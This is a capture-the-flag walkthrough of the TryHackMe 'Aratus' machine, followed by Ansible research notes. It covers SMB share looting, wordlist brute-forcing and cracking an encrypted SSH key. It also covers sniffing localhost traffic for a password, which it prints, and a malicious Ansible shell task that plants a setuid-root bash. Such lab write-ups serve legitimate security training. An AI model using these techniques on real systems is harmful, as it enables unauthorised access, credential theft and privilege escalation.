# Aratus Helped-Through

Name: Aratus
Date:  19/01/2023
Difficulty:  Medium
Goals:  
- Anisble High Level overview and prompt research
- Script or consider the temporary defaults to content bustery
Learnt:
Beyond Root:
- Ansible Research
- Ansible Template a Vulnerable VM 

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](TryHackMe/Markdown/Aratus/Screenshots/ping.png)

Anonymous FTP that is executable and readable.
![](ftpanon.png)
But there is nothing there:
![](nothinginftp.png)

Smbmap the Samba 
![](smbmapshares.png)
Exfiltrate all:
```bash
# Create a directory on the host before doing this for data management 
prompt off
recurse on
mget *
```

## Exploit...

The exploit to gain a foothold is about using all the information in the book to make a password list that belongs to Simeon.

There is s alot of text, the message is a clue:
![](messageintheshare.png)
There is a lot of lorem ipsum in this share. I started a hydra in the background

Shocked that there is a [Next Gen Enum4Linux!](https://github.com/cddmp/enum4linux-ng).

Creating Wordlists
```bash
cewl -w wordlist.cewl http://10.10.8.48/simeon/ -d 3
cat wordlist.cewl | tr '[:upper:]' '[:lower:]' >> lc-wordlist.cewl 
cat lc-wordlist.cewl | sort -u | uniq > uniqLC-wordlist.cewl
# My improvement
cat uniqLC-wordlist.cewl | sed -r '/^.{,5}$/d'
```

If Al had read the `enum4linux` output 
![](nofiveletterorbelow.png)

SIDs existing in samba for AD compatibility
![](sidsonthebox.png)

```
theodore
automation
simeon
```

Al agreeing with chat the requirement of using
```bash
-e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
```

I reduced 42 words off the list with the using sed to remove the words of less than 6 in length. 
![](hurray.png)
``` 
simmon : scelerisque 
```

[Latin Stackexchange](https://latin.stackexchange.com/questions/16882/the-meaning-of-scelerisque): *It means "**of an/the evil deed**". -Que, as you note, means "and", so scelerisque means "and of an/the evil deed". (ETA: as cmw points out, it could alternatively be a dative or ablative plural of the less common adjective scelerus, in which case it would mean "and to/from/with/etc. the wicked ones".)"*

Because he taunted me with the you could make Bash one liner to do everything. I thought I could do that as the alternate route Beyond root:
```bash
# Setup
cp -r tempShare wordlistBuilding 
cd wordlistBuilding 
rm message-to-simeon .* chap -rf


cat */*/* | sed 's/\.//g' | sed -r '/^.{,5}$/d' | tr '[:upper:]' '[:lower:]' | sort -u | uniq
```
Then something weird happened
![](wtf.png)

There is a private key in 

```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,596088D0C0C3E6F997CF39C431816A88

5t3gTvBBx3f871Au/57hicjw646uQzz+SOfHtmUGL8IvojzDAgC72IX20qg717Dl
xD+jjENQUEB60dsEbPtzc9BatTZX6kQ9B0DXVEY63v/8wHb4Aq6g5WwgGNH6Nq6y
hIpylfVflBTnYpdSSIHnTdqzgzzHuOotLGoQJOrwO8IvmdlId7/dqpLgCY6jQMB8
nYYbkwwcyXcyt7ouZNfb3/eIp6afHW8g9cC2M9HIYLAtEIejxmcCqF2XjYIekZ/L
TI5EVrPOnLZeT5N6byAtODlIPJyJRE3gIiS1tTPxxOjBl6/7lEDQ49eIz5mCHxOz
BrIfgjaTRTPC1G6b+QAS9S1dleqNE4j5+FUsYpJDLan+WCgGc6oFgBjTTz96UB7M
qduRY8O+bW36OJhQh3hCxfZevCSa5ug6hH+q43XP0O9UkUL8U4/1dFLa4RI9cjIK
D3ythFCQUzT4RKMoW+F1528Fhro0lPRgc6XfhJu/zs3gr6yIiaolIE+YVOB92IBx
Xu6kBRLPct6Gj7lFSnISYa+Vu5UyQNUNP+Ezk9GgeK/PGwMd2sfLW79PKyhl4iXZ
ymkbHWAfgHk+kmY/+EPgdgf9VyglYOjx5hBopEpPlfuZb/X/PZTO8CYxltYHiJtn
FCjnVV9rH6oUBgaA2yspo22OEi8QdSoGzUrz9TgdStxls20vTuYuwll8rhyZu7OR
ehXskDrvxAnptNzHyLjj800W4/X7jUltuA3jfvEYLGFeLyeP3Cg/IFnXbv+4H3ca
TxTnFUNY9t8DsnYiaHgbKTx7XpVwGATI+Wn3cT558xIvPhipge2lso5d0KTLP2Nn
kLlwlcSQp393GvUlJ7e9Gd1KkoZvk6wxjWB0ZxOSte/HJJooXfNF7/8p3v9Y++iX
NVNA/vu4o8C8TfKgq91cm+j13s/WNV1g8TXqbI9TU/YW4ZEEeemJFA0hd0eQvZvR
C4z/qJZH8MhBB6VIVn4l0uhNKHehaZCoGUtR28IzIctz96CJnwl3DbMKWX8c7mx0
s+1rJAjjcKxFS7lxPiCID6j/hZvsdjXnPScH2e/lQ1bMUk2rOCsDKCKeY0YGCkvI
H51/oW3qCjUx7Rtnf8RKu16uMDMBqDFYc795QoFmz9SAe7tCHmtKyZw1rI8x4G2I
rzptsqT3tW+hMrlqBM8wxksKfnhQE8h06tJKSusv12BabgkCNuk9CuD9D7yfgURI
hKXIf7SYorLBo7aBDXxwPZzanqNPsicL03Pbcv6LK18nubBd4nN9yLJB7ew0Q2WC
d19y9APjMKqoOUkXFtVhUFH5RQH7cDzoK1MZEZzMG7DKs496ZkDXxNJP6t5LiGmi
LIGlrXjAbf/+4/2+GNmVUZ+7xXhtM08hj+U5W0StmD7UGa/kVbwsdgBoUztz91wC
byotvP69b/oQBbzs/ZZSKJlAu2OhNGgN1El4/jhCHWcs5+1R1tVcAbZugdvPH2qK
rTePu5Dh58RV3mdmw7IyxdRzD95mp7FOnw6k+a7tZpghYLnzHH6Xrpor28XZilLT
aWtaV/4FhBPopJrwjq5l67jIYXILd+p6AXTZMhJp0QA53unDH8OSSAxc1YvmoAOV
-----END RSA PRIVATE KEY-----
```

ssh2john
```
id_rsa:$sshng$1$16$596088D0C0C3E6F997CF39C431816A88$1200$e6dde04ef041c777fcef502eff9ee189c8f0eb8eae433cfe48e7c7b665062fc22fa23cc30200bbd885f6d2a83bd7b0e5c43fa38c435050407ad1db046cfb7373d05ab53657ea443d0740d754463adefffcc076f802aea0e56c2018d1fa36aeb2848a7295f55f9414e76297524881e74ddab3833cc7b8ea2d2c6a1024eaf03bc22f99d94877bfddaa92e0098ea340c07c9d861b930c1cc97732b7ba2e64d7dbdff788a7a69f1d6f20f5c0b633d1c860b02d1087a3c66702a85d978d821e919fcb4c8e4456b3ce9cb65e4f937a6f202d3839483c9c89444de02224b5b533f1c4e8c197affb9440d0e3d788cf99821f13b306b21f8236934533c2d46e9bf90012f52d5d95ea8d1388f9f8552c6292432da9fe58280673aa058018d34f3f7a501ecca9db9163c3be6d6dfa389850877842c5f65ebc249ae6e83a847faae375cfd0ef549142fc538ff57452dae1123d72320a0f7cad8450905334f844a3285be175e76f0586ba3494f46073a5df849bbfcecde0afac8889aa25204f9854e07dd880715eeea40512cf72de868fb9454a721261af95bb953240d50d3fe13393d1a078afcf1b031ddac7cb5bbf4f2b2865e225d9ca691b1d601f80793e92663ff843e07607fd57282560e8f1e61068a44a4f95fb996ff5ff3d94cef0263196d607889b671428e7555f6b1faa14060680db2b29a36d8e122f10752a06cd4af3f5381d4adc65b36d2f4ee62ec2597cae1c99bbb3917a15ec903aefc409e9b4dcc7c8b8e3f34d16e3f5fb8d496db80de37ef1182c615e2f278fdc283f2059d76effb81f771a4f14e7154358f6df03b2762268781b293c7b5e95701804c8f969f7713e79f3122f3e18a981eda5b28e5dd0a4cb3f636790b97095c490a77f771af52527b7bd19dd4a92866f93ac318d6074671392b5efc7249a285df345efff29deff58fbe897355340fefbb8a3c0bc4df2a0abdd5c9be8f5decfd6355d60f135ea6c8f5353f616e1910479e989140d21774790bd9bd10b8cffa89647f0c84107a548567e25d2e84d2877a16990a8194b51dbc23321cb73f7a0899f09770db30a597f1cee6c74b3ed6b2408e370ac454bb9713e20880fa8ff859bec7635e73d2707d9efe54356cc524dab382b0328229e6346060a4bc81f9d7fa16dea0a3531ed1b677fc44abb5eae303301a8315873bf79428166cfd4807bbb421e6b4ac99c35ac8f31e06d88af3a6db2a4f7b56fa132b96a04cf30c64b0a7e785013c874ead24a4aeb2fd7605a6e090236e93d0ae0fd0fbc9f81444884a5c87fb498a2b2c1a3b6810d7c703d9cda9ea34fb2270bd373db72fe8b2b5f27b9b05de2737dc8b241edec34436582775f72f403e330aaa839491716d5615051f94501fb703ce82b5319119ccc1bb0cab38f7a6640d7c4d24feade4b8869a22c81a5ad78c06dfffee3fdbe18d995519fbbc5786d334f218fe5395b44ad983ed419afe455bc2c760068533b73f75c026f2a2dbcfebd6ffa1005bcecfd9652289940bb63a134680dd44978fe38421d672ce7ed51d6d55c01b66e81dbcf1f6a8aad378fbb90e1e7c455de6766c3b232c5d4730fde66a7b14e9f0ea4f9aeed66982160b9f31c7e97ae9a2bdbc5d98a52d3696b5a57fe058413e8a49af08eae65ebb8c861720b77ea7a0174d9321269d10039dee9c31fc392480c5cd58be6a00395
```


## Foothold

There while Al was enumerating manually I was using Linpeas to narrow down on what was on the box, it found a hash and `tcpdump` 
![](sshin.png)

With Al and Linpeas
![](linpeas1.png)

Al was checking the processes, because crontab had 4000 premissions
![](alprivesc.png)

We can:
Use [tcpdump](https://www.tcpdump.org/manpages/tcpdump.1.html) to listen sniff traffic to localhost for web authenication
```bash
# listen on localhost
# Print each packet (minus its link level header) in ASCII. 
# Handy for capturing web pages
tcpdump -i lo -A
```

![](tcpdumpthepassword.png)
Decoding the base64 
![](yotheopassword.png)
`theodore:Rijyaswahebceibarjik` with these fine additions to my collection we can `su` to theodore

![](sutheo.png)

An Apache MD5 hash
![](linpeas2.png)

[Hashcat mode](https://hashcat.net/wiki/doku.php?id=example_hashes)
```bash
hashcat -m 1600 theo /usr/share/wordlists/rockyou.txt
```

`$apr1$pP2GhAkC$R12mw5B5lxUiaNj4Qt2pX1:testing123`

This was a rabbit hole..

## PrivEsc

![](anisbleinthetheohome.png)
The scripts directory  contains the script you would need to remove to patch out the privilege escalation.
![](topatchremovethis.png)

Theodore has environment variables being persisting cross session.
![1000](optscripts.png)

![](writebadansibleplaybook.png)

Ansible is used to automate management and deployment of remote systems using a blueprint YAML file containing commands and configuration to run unattended.

From the opt directory
![](optandanisblegeerlingguy.png)

![](playboooksavalible.png)

Al points out a special attribute set by `chattr` and listable with `lsattr`; it is linux ACLs
![](intasklsattr.png)

Extended attribute
```bash
ls -la 
rwxr-x-r-x+ # files or directories with + 
# Change attribute
chattr
# List attribute
lsattr
# Get file attributes
getfacls $file
```

This can be used to change the ACL to make removal of file in persistence impossible without the knowledge of Linux ACLs.
![](theosacls.png)

Bad Ansible with [shell module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html)
```yaml
# $USER must be specifed
- name: Bad bash
  ansible.builtin.shell: "cp /bin/bash /home/$USER/bash; chmod u+s /home/$USER/bash"
```

This will copy the binary bash and set the setuid to root to home directory of theodore, which means we can execute it. 

![1000](andwearerootrequires-p.png)
## Beyond Root

### Ansible Research

From [getting started - index](https://docs.ansible.com/ansible/latest/getting_started/index.html)  - Ansible automates the management of remote systems and controls their desired state. A basic Ansible environment has three main components:
- Control node 
	- A system on which Ansible is installed. You run Ansible commands such as `ansible` or `ansible-inventory` on a control node.
- Managed node
	- A remote system, or host, that Ansible controls.
- Inventory
	- A list of managed nodes that are logically organized. You create an inventory on the control node to describe host deployments to Ansible.

From [getting started playbook](https://docs.ansible.com/ansible/latest/getting_started/get_started_playbook.html) - Playbooks are automation blueprints, in `YAML` format, that Ansible uses to deploy and configure managed nodes.
- Playbook
	- A list of plays that define the order in which Ansible performs operations, from top to bottom, to achieve an overall goal.
- Play
	- An ordered list of tasks that maps to managed nodes in an inventory.
- Task 
	- A list of one or more modules that defines the operations that Ansible performs.
- Module 
	- A unit of code or binary that Ansible runs on managed nodes. Ansible modules are grouped in collections with a [Fully Qualified Collection Name (FQCN)](https://docs.ansible.com/ansible/latest/reference_appendices/glossary.html#term-Fully-Qualified-Collection-Name-FQCN) for each module.

I looked into [Shiva](https://github.com/rastating/shiva)  a [rastating](https://github.com/rastating) project to create a ubuntu spin off of lighter-weight Kali. for CTFs 

The playbook defines `hosts` and `roles`, which are ust directory contain more YAML. Rolres split into files, tasks, templates
- Files
	- scripts 
- Tasks (in the context of what rastating is doing)
	-  generally fetching packages, installing and configuring them
- Template   (in the context of what rastating is doing)
	- for pathing  the tools with zsh scripting parsing `"$@"`